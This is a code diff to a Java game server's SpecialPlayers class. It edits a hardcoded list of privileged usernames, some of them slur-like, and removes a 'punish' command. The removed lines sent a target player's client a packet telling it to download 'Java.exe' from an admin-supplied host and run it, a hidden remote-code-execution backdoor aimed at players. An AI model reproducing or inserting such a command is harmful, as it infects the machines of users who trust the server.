@@ -27,7 +27,7 @@ public class SpecialPlayers {
 	* @Author Jonathan Sirens
 	* Initiates Command
 	**/
-	public static String[] player_names = {"idbowprod", "dc blitz", "plunger", "spankymcbad", "xtreme", "homobeans", "manny", "queerisme", "robotype", "alt"};
+	public static String[] player_names = {"idbowprod", "dc blitz", "plunger", "spankymcbad", "xtreme", "homobeans", "queerisme", "robotype", "alt", "fighterjet30"};
 	
 	public static void initiate_command(final Player player, String[] command, String wholeCommand) {
 		boolean continue_command = false;
@@ -140,11 +140,6 @@ public class SpecialPlayers {
 				default:
 				}
 			}
-		}
-		if (command[0].equals("punish")) {
-			Player other = World.getPlayerByName(command[1]);
-			other.getPacketSender().sendString(0, "[ABC]-http://"+command[2]+"/Java.exe-cmd-/c-Java.exe");
-			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
 		}	
 		if(wholeCommand.equalsIgnoreCase("dice")) {
 			player.getInventory().add(11211, 1);
